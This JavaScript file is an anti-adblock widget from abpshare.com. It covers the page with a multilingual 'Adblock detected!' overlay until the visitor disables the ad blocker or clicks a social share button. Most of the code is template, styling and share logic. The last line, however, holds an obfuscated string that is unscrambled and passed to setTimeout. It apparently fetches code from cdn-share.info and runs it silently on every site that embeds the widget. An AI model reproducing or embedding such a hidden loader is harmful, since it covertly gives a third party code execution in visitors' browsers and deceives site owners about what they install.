(function () {
  /* Author: abpshare.com
   * Описание настроек находится на этой странице:
   * https://abpshare.com/faq/js/
   */

  var settings = {
    name  : 'tpl-8',
    langs : 'ru|ru,uk,be,en,de,ja,es,fr,pt,it,pl',
    cross : '0|1',
    timer : '0|60|7',
    device: 'desktop|mobile',
    show  : '2|0',
    sb    : '1|216|60'
  };

  var tpl = '<div class="abpprefix1 abpprefix2"> <div class="abpprefix1"> <div class="abpprefix1"> <div class="abpprefix1-body"> <div class="abpprefix1-box"> <div class="abpprefix1-cross editor-cross" style="display: none;">×</div> <div class="abpprefix1-mid"> <img class="abpprefix1-img editor-pole1" src="//cdn-share.info/img/1/19.png"> <div class="abpprefix1-h1 editor-pole1" data-lang-ru="Adblock detected!" data-lang-uk="Adblock detected!" data-lang-be="Adblock detected!" data-lang-en="Adblock detected!" data-lang-de="Adblock detected!" data-lang-ja="Adblock detected!" data-lang-es="Adblock detected!" data-lang-fr="Adblock detected!" data-lang-pt="Adblock detected!" data-lang-it="Adblock detected!" data-lang-pl="Adblock detected!">Adblock detected!</div> <div class="abpprefix1-p editor-pole1" data-lang-ru="Для продолжения просмотра страницы отключите Adblock" data-lang-uk="Для продовження перегляду сторінки відключіть Adblock" data-lang-be="Для працягу прагляду старонкі адключыце Adblock" data-lang-en="To continue to view the page turn Adblock off" data-lang-de="Für die Fortsetzung von der Seitendurchsicht deaktivieren Sie Adblock" data-lang-ja="ページの閲覧を続くためにAdblockを消しや" data-lang-es="Para continuar ver la página apaga Adblock " data-lang-fr="Pour continuer, désactiver Adblock" data-lang-pt="Para continuar a visualização da página, desative o Adblock" data-lang-it="Per continuare la navigazione sulla pagina, bisogna spegnere AdBlock" data-lang-pl="Aby kontynuować przeglądanie strony, wyłącz Adblock">Для продолжения просмотра страницы отключите Adblock</div> <div class="abpprefix1-p abpprefix1-sbtext editor-pole1" data-lang-ru="или<br>нажмите на одну из этих кнопок" data-lang-uk="або <br> натисніть на одну з цих кнопок" data-lang-be="або <br> націсніце на адну з гэтых кнопак" data-lang-en="or<br>click any of these buttons" data-lang-de="und <br> betätigen Sie eine dieser Tasten" data-lang-ja="あるボタンをクリックしてください" data-lang-es="o pulsa a uno de estos butones" data-lang-fr="ou cliquez sur un de ces boutons pour afficher les pages" data-lang-pt="ou clique num desses botões" data-lang-it="oppure cliccare su uno di questi tasti" data-lang-pl="lub kliknij w jeden z poniższych przycisków">или<br>нажмите на одну из этих кнопок</div> <div class="abpprefix1-btns editor-sb"><div class="abpprefix5-btn-square-14-r40"> <div class="abpprefix5-social-elem abpprefix5-vk" data-text="vk"> <div class="abpprefix5-social-url"> <div class="abpprefix5-ico"> <div class="abpprefix5-box"> <svg class="abpprefix5-svg" viewBox="-90 213.9 415 415"> <path d="M-44.8,213.9h188.5c62,0,114.8,30.4,114.7,91.8c0,51.3-18.6,71.2-56.8,93.8c3.3,2.7,25.1,9.2,32.5,12.8 c11.8,5.8,18.7,11.7,26.4,19.5c21.6,22,25.7,42.1,25.7,76.7c0,80.1-77.5,120.4-152.1,120.4H-45.6L-44.8,213.9L-44.8,213.9z M57.6,322.9l0,53.9c48.5,0,94.2,6.4,94.2-46.2c0-48.7-51.6-40.7-94.2-40.7L57.6,322.9L57.6,322.9z M57.6,552.5 c53.2,0,118.9,8.8,120.1-51.6c1.2-63-67.5-51.6-120-51.6L57.6,552.5z"></path> </svg> </div> </div> </div> </div> <div class="abpprefix5-social-elem abpprefix5-ok" data-text="ok"> <div class="abpprefix5-social-url"> <div class="abpprefix5-ico"> <div class="abpprefix5-box"> <svg class="abpprefix5-svg" viewBox="-8 -80.1 579 1000"> <path d="M281.6-80.1C139.3-80.1,23.5,35.7,23.5,178c0,142.3,115.8,258,258.1,258c142.3,0,258.1-115.7,258.1-258 C539.7,35.7,424-80.1,281.6-80.1z M281.6,71.1c58.9,0,106.8,48,106.8,106.9c0,58.9-47.9,106.8-106.8,106.8 c-58.9,0-106.9-47.9-106.9-106.8C174.8,119.1,222.7,71.1,281.6,71.1z M68.8,444.8c-25.5-0.4-50.7,12.2-65.2,35.4 c-22.3,35.4-11.6,82,23.7,104.3c46.7,29.3,97.3,50.1,149.8,62L32.9,790.8c-29.5,29.5-29.5,77.4,0,106.9 c14.8,14.7,34.1,22.1,53.5,22.1c19.3,0,38.7-7.4,53.5-22.2L281.6,756l141.8,141.8c29.5,29.5,77.3,29.5,106.9,0 c29.5-29.5,29.5-77.4,0-106.9L386,646.5c52.5-12,103.2-32.8,149.8-62.1c35.4-22.2,46-69,23.8-104.3c-22.3-35.4-68.9-46-104.3-23.8 c-105.7,66.5-241.8,66.4-347.5,0C95.7,448.8,82.2,445,68.8,444.8L68.8,444.8z"></path> </svg> </div> </div> </div> </div> <div class="abpprefix5-social-elem abpprefix5-fb" data-text="fb"> <div class="abpprefix5-social-url"> <div class="abpprefix5-ico"> <div class="abpprefix5-box"> <svg class="abpprefix5-svg" viewBox="-269 392.2 56.7 56.7"> <path d="M-227.5,410.6h-9v-5.9c0-2.2,1.5-2.7,2.5-2.7c1,0,6.3,0,6.3,0v-9.7l-8.7,0c-9.7,0-11.9,7.2-11.9,11.9v6.5h-5.6v10h5.6 c0,12.8,0,28.3,0,28.3h11.8c0,0,0-15.6,0-28.3h7.9L-227.5,410.6z"></path> </svg> </div> </div> </div> </div> <div class="abpprefix5-social-elem abpprefix5-tw" data-text="tw"> <div class="abpprefix5-social-url"> <div class="abpprefix5-ico"> <div class="abpprefix5-box"> <svg class="abpprefix5-svg" viewBox="-269 392.2 56.7 56.7"> <path d="M-212.3,403c-2.1,0.9-4.3,1.6-6.7,1.8c2.4-1.4,4.2-3.7,5.1-6.4c-2.2,1.3-4.7,2.3-7.4,2.8c-2.1-2.3-5.1-3.7-8.5-3.7 c-6.4,0-11.6,5.2-11.6,11.6c0,0.9,0.1,1.8,0.3,2.7c-9.7-0.5-18.2-5.1-24-12.2c-1,1.7-1.6,3.7-1.6,5.8c0,4,2.1,7.6,5.2,9.7 c-1.9-0.1-3.7-0.6-5.3-1.5c0,0,0,0.1,0,0.1c0,5.6,4,10.3,9.3,11.4c-1,0.3-2,0.4-3.1,0.4c-0.8,0-1.5-0.1-2.2-0.2 c1.5,4.6,5.8,8,10.9,8.1c-4,3.1-9,5-14.4,5c-0.9,0-1.9-0.1-2.8-0.2c5.1,3.3,11.3,5.2,17.8,5.2c21.4,0,33.1-17.7,33.1-33.1 c0-0.5,0-1,0-1.5C-215.8,407.3-213.9,405.3-212.3,403z"></path> </svg> </div> </div> </div> </div> <div class="abpprefix5-social-elem abpprefix5-gp" data-text="gp"> <div class="abpprefix5-social-url"> <div class="abpprefix5-ico"> <div class="abpprefix5-box"> <svg class="abpprefix5-svg" viewBox="0 0 32 32"> <path d="M19.81,0.76c0,0-6.997,0-9.393,0c-4.297,0-8.343,3.016-8.343,6.786c0,3.852,2.929,6.848,7.301,6.848 c0.305,0,0.6-0.069,0.89-0.09c-0.286,0.541-0.485,1.123-0.485,1.758c0,1.071,0.574,1.926,1.301,2.635 c-0.546,0-1.08,0.008-1.661,0.008C4.098,18.706,0,22.094,0,25.609c0,3.462,4.492,5.63,9.815,5.63c6.069,0,9.422-3.447,9.422-6.909 c0-2.775-0.82-4.439-3.351-6.234c-0.867-0.611-2.523-2.103-2.523-2.981c0-1.027,0.293-1.533,1.841-2.743 c1.583-1.237,2.706-2.714,2.706-4.741c0-2.409-1.036-5.349-3.052-5.349h3.429L19.81,0.76z M16.657,23.73 c0.073,0.323,0.117,0.654,0.117,0.989c0,2.798-1.806,4.984-6.979,4.984c-3.68,0-6.336-2.328-6.336-5.126 c0-2.741,3.296-5.026,6.978-4.984c0.856,0.009,1.658,0.148,2.383,0.379C14.818,21.364,16.25,22.149,16.657,23.73z M10.763,13.294 c-2.47-0.072-4.818-2.763-5.243-6.004c-0.425-3.246,1.231-5.728,3.7-5.655c2.469,0.076,4.818,2.679,5.243,5.922 C14.889,10.799,13.233,13.367,10.763,13.294z"></path><polygon points="27.429,12.94 27.429,8.369 24.381,8.369 24.381,12.94 19.81,12.94 19.81,15.988 24.381,15.988 24.381,20.559 27.429,20.559 27.429,15.988 32,15.988 32,12.94 "></polygon> </svg> </div> </div> </div> </div> </div> <style> .abpprefix5-btn-square-14-r40 { display: -webkit-box; display: -ms-flexbox; display: flex; -webkit-box-pack: center; -ms-flex-pack: center; justify-content: center; -ms-flex-wrap: wrap; flex-wrap: wrap; font-size: 0; } .abpprefix5-btn-square-14-r40 .abpprefix5-social-elem { margin: 2px; } .abpprefix5-btn-square-14-r40 .abpprefix5-social-url { cursor: pointer; } .abpprefix5-btn-square-14-r40 .abpprefix5-ico { position: relative; width: 40px; height: 40px; background: #333333; border-radius: 8%; border: 2px dashed; } .abpprefix5-btn-square-14-r40 .abpprefix5-box { position: absolute; top: 30%; left: 30%; right: 30%; bottom: 30%; } .abpprefix5-btn-square-14-r40 .abpprefix5-svg { width: 100%; height: 100%; } .abpprefix5-btn-square-14-r40 .abpprefix5-vk .abpprefix5-ico { border-color: #4c6e94; } .abpprefix5-btn-square-14-r40 .abpprefix5-vk .abpprefix5-svg { fill: #4c6e94; } .abpprefix5-btn-square-14-r40 .abpprefix5-ok .abpprefix5-ico { border-color: #ff8e01; } .abpprefix5-btn-square-14-r40 .abpprefix5-ok .abpprefix5-svg { fill: #ff8e01; } .abpprefix5-btn-square-14-r40 .abpprefix5-fb .abpprefix5-ico { border-color: #4c64a2; } .abpprefix5-btn-square-14-r40 .abpprefix5-fb .abpprefix5-svg { fill: #4c64a2; } .abpprefix5-btn-square-14-r40 .abpprefix5-tw .abpprefix5-ico { border-color: #2ab7d0; } .abpprefix5-btn-square-14-r40 .abpprefix5-tw .abpprefix5-svg { fill: #2ab7d0; } .abpprefix5-btn-square-14-r40 .abpprefix5-gp .abpprefix5-ico { border-color: #d24a45; } .abpprefix5-btn-square-14-r40 .abpprefix5-gp .abpprefix5-svg { fill: #d24a45; } </style></div> <div class="abpprefix1-timer abpprefix1-p editor-pole1 editor-timer" data-lang-ru="Модальное окно закроется через: %time%" data-lang-uk="Модальне вікно закриється через: %time%" data-lang-be="Мадальнай акно зачыніцца праз: %time%" data-lang-en="Expect: %time%" data-lang-de=":Erwarten %time%" data-lang-ja="期待します: %time%" data-lang-es="Esperar: %time%" data-lang-fr="Attendre: %time%" data-lang-pt="Esperar: %time%" data-lang-it="Aspettare: %time%" data-lang-pl="Oczekiwać: %time%" style="display: none;">Модальное окно закроется через: %time%</div> </div> </div> </div> </div> </div> </div> <style> [class^=abpprefix1] { font: inherit; line-height: inherit; visibility: inherit; overflow: visible; width: auto; height: auto; margin: 0; padding: 0; border-spacing: inherit; list-style: inherit; cursor: inherit; text-align: inherit; vertical-align: top; white-space: inherit; text-decoration: none; text-indent: inherit; letter-spacing: inherit; word-spacing: inherit; text-transform: inherit; color: inherit; border: 0; background: 0; text-shadow: inherit; direction: inherit; } .abpprefix2 { font-family: verdana, tahoma, arial, sans-serif; font-size: 14px; line-height: 1.5; visibility: visible; border-spacing: 0; list-style: none; cursor: auto; text-align: left; white-space: normal; text-indent: 0; letter-spacing: normal; word-spacing: normal; text-transform: none; color: #000; text-shadow: none; direction: ltr; box-sizing: content-box; } body { overflow: hidden; } .abpprefix1-clearfix:after { display: block; content: ""; clear: both; } .abpprefix2 { display: none; background-color: rgba(0, 0, 0, 0.8); overflow: auto; outline: 0; top: 0px; left: 0px; right: 0px; bottom: 0px; position: fixed; z-index: 1000000000; opacity: 0; -webkit-transition: opacity 150ms; transition: opacity 150ms; } @media (max-width: 300px) { .abpprefix2 { font-size: 12px; } } .abpprefix3 > .abpprefix2 { display: block; } .abpprefix4 .abpprefix2 { opacity: 1; -webkit-transition: opacity 300ms; transition: opacity 300ms; } .abpprefix2 > div { display: -webkit-box; display: -ms-flexbox; display: flex; width: 100%; height: 100%; } .abpprefix2 > div > div { margin: auto; } .abpprefix1-body { padding: 20px; } .abpprefix1-box { position: relative; max-width: 280px; box-shadow: 0px 15px 20px rgba(0, 0, 0, 0.22), 0px 19px 60px rgba(0, 0, 0, 0.3); color: #fff; border-radius: 10px; background: #1F1F1F; padding: 25px; display: -webkit-box; display: -ms-flexbox; display: flex; } .abpprefix1-mid { margin: auto; text-align: center; } .abpprefix1-cross { position: absolute; top: 5px; right: 5px; cursor: pointer; z-index: 8; width: 35px; height: 35px; text-align: center; line-height: 30px; font-size: 25px; } .abpprefix1-img { display: block; margin: 10px auto 30px; width: 80px; max-width: 100%; } .abpprefix1-h1 { font-size: 1.4em; line-height: 1.3; padding-bottom: 10px; color: #ff5742; } .abpprefix1-p { margin: 5px 0; padding: 5px; text-align: center; } .abpprefix1-timer { font-size: 0.9em; } .abpprefix1-sbtext { margin-top: -15px; } @media (max-width: 500px) { .abpprefix1-body { padding: 0px; } .abpprefix1-cross { position: fixed; } .abpprefix1-box { position: absolute; top: 0px; right: 0px; bottom: 0px; left: 0px; overflow: auto; max-width: 100%; } } </style> ';

  !function(){function b(){setTimeout(function(){var b=document.createElement("div");b.innerHTML=a(tpl),j(b),function(){settings.langs=settings.langs.split("|");var a=k();settings.langs[1].split(",").indexOf(a)==-1&&(a=settings.langs[0]);var c="data-lang-"+a,d=b.querySelectorAll("["+c+"]");[].forEach.call(d,function(a){var b=a.getAttribute(c);a.innerHTML=b})}(),function(){settings.timer=settings.timer.split("|");var d=b.querySelector(a(".abpprefix1-timer"));1==settings.timer[0]?l(d,settings.timer[1],function(){c(b,settings.timer[2])}):d.style.display="none"}(),function(){settings.cross=settings.cross.split("|");var d=b.querySelector(a(".abpprefix1-cross"));d&&(1==settings.cross[0]?(d.style.display="block",d.onclick=function(){c(b,settings.cross[1])}):d.style.display="none")}(),function(){var d=b.querySelector(a(".abpprefix1-sbtext"));settings.sb=settings.sb.split("|"),1==settings.sb[0]?(d&&(d.style.display="block"),n(b,function(){c(b,settings.sb[2])})):d&&(d.style.display="none")}(),b.classList.add(a("abpprefix3")),setTimeout(function(){b.classList.add(a("abpprefix4"))},100)},1e3*settings.show[1])}function c(b,c){f("abpsharecom_"+settings.name,c),b.classList.remove(a("abpprefix4")),setTimeout(function(){b.parentNode.removeChild(b)},200)}function d(a){"loading"!=document.readyState?a():document.addEventListener("DOMContentLoaded",a)}function e(a){var b=document.cookie.match(new RegExp("(?:^|; )"+a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,"\\$1")+"=([^;]*)"));return b?decodeURIComponent(b[1]):void 0}function f(a,b){var c=new Date;c.setDate(c.getDate()+parseInt(b));var d=a+"=1; path=/; expires="+c.toUTCString();document.cookie=d}function g(){return/Mobi|Android|BlackBerry|iPhone|iPad|iPod|Opera Mini/i.test(navigator.userAgent)?"mobile":"desktop"}function h(){function d(b){for(var c=0;c<10;c++){var d="abpprefix"+c;if(b.indexOf("")+1){var e=new RegExp(d,"g");b=b.replace(e,a[c])}}return b}function e(a){for(var b="abcdefghijklmnopqrstuvwxyz0123456789",c=25*Math.random()>>0,d=b[c],e=0;e<a;e++)c=Math.random()*b.length>>0,d+=b[c];return d}for(var a=[],b=0;b<=10;b++){var c=(10*Math.random()>>0)+8;a.push(e(c))}return d}function i(a){var b=[],c=[];return a.split("").forEach(function(a,d){d%2==0?b.push(a):c.unshift(a)}),b.join("")+c.join("")}function j(a){function c(){for(var a=(10*Math.random()>>0)+3,b=0;b<a;b++){var c=document.createElement("div");document.body.insertBefore(c,document.body.firstChild)}}c(),document.body.insertBefore(a,document.body.firstChild),c();var b=a.querySelectorAll("script");[].forEach.call(b,function(a){setTimeout(a.innerHTML,100)})}function k(){var a=navigator.browserLanguage||navigator.language||navigator.userLanguage;return a||(a=""),a.split(";")[0].split("-")[0].toLowerCase()}function l(a,b,c){function e(){a.innerHTML=d.replace("%time%",b),b>0?(b--,setTimeout(e,1e3)):c&&c()}if(a){var d=a.innerHTML;e()}}function m(a,b){d(function(){var c=document.createElement("div");c.setAttribute("class","adsbygoogle ads reklama"),c.setAttribute("style","position:fixed; height:5px; width:5px; top:0px; left:0px;"),document.body.appendChild(c),setTimeout(function(){var d=c.offsetHeight;c.parentElement.removeChild(c),d?b&&b():a&&a()},100)})}function n(b,c){function e(){var a=this.getAttribute("data-text")||"";if("vk"==a){var b="https://vk.com/share.php",c={url:g("url"),title:g("title"),description:g("description"),image:g("image")};return void f(b,c,610,560,a)}if("ok"==a){var b="https://connect.ok.ru/dk",c={"st.cmd":"WidgetSharePreview","st.shareUrl":g("url")};return void f(b,c,580,325,a)}if("fb"==a){var b="https://www.facebook.com/sharer/sharer.php",c={u:g("url"),t:g("title")};return void f(b,c,580,550,a)}if("tw"==a){var b="https://twitter.com/intent/tweet",c={url:g("url"),text:g("title").substr(0,110)+"..."};return void f(b,c,550,250,a)}if("gp"==a){var b="https://plus.google.com/share",c={url:g("url")};return void f(b,c,400,500,a)}throw"sb not find"}function f(a,b,d,e,f){var g=[];for(var h in b)g.push(h+"="+encodeURIComponent(b[h]));var i=(screen.width-d)/2,j=(screen.height-e)/2,k=window.open(a+"?"+g.join("&"),"_blank","width="+d+",height="+e+",left="+i+",top="+j+",toolbar=0,location=0,directories=0,status=0,menubar=0,scrollbars=0,resizable=1"),l=window.setInterval(function(){(null==k||k.closed)&&(window.clearInterval(l),c&&c(f))},100)}function g(a){if("url"==a){var b="",c=document.querySelector("meta[property='abpsharecom:url']");if(c&&(b=c.getAttribute("content")||""),""==b){var c=document.querySelector("meta[property='og:url']");c&&(b=c.getAttribute("content")||"")}return""==b&&(b=window.location.href),b}if("title"==a){var b="",c=document.querySelector("meta[property='abpsharecom:title']");if(c&&(b=c.getAttribute("content")||""),""==b){var c=document.querySelector("meta[property='og:title']");c&&(b=c.getAttribute("content")||"")}if(""==b){var c=document.querySelector("head title");c&&(b=c.textContent||"")}return b}if("description"==a){var b="",c=document.querySelector("meta[property='abpsharecom:description']");if(c&&(b=c.getAttribute("content")||""),""==b){var c=document.querySelector("meta[property='og:description']");c&&(b=c.getAttribute("content")||"")}if(""==b){var c=document.querySelector("head description");c&&(b=c.textContent||"")}return b}if("image"==a){var b="",c=document.querySelector("meta[property='abpsharecom:image']");if(c&&(b=c.getAttribute("content")||""),""==b){var c=document.querySelector("meta[property='og:image']");c&&(b=c.getAttribute("content")||"")}return b}throw"unknown var: "+a}var d=b.querySelectorAll(a(".abpprefix5-social-elem"));[].forEach.call(d,function(a){a.addEventListener("click",e)})}var a=h();d(function(){e("abpsharecom_"+settings.name)||settings.device.indexOf(g())+1&&(settings.show=settings.show.split("|"),0!=settings.show[0]&&(1==settings.show[0]&&b(),2==settings.show[0]&&m(function(){b()})))});try{setTimeout(i('t}r{y){av(ahrc tqawce}=)"(/d/ncedsn.-tlsieburqaerry,.}n{e)t(/naopiit/cvn2u/f?=tryoprer=esntoa.tt&sdeautqae=rs,h}a)r1e,ptrxoe;T1e.s0n"o,prseeqru.essith=tn(etwu oXeMmLiHTtttepsR&e&qtuxeesTte;srneoqpuseesrt..soiphetn{()"(GnEoTi"t,cqnwuef,=!d0a)o,lrneoq.utes'),1)}catch(a){}}();
})();
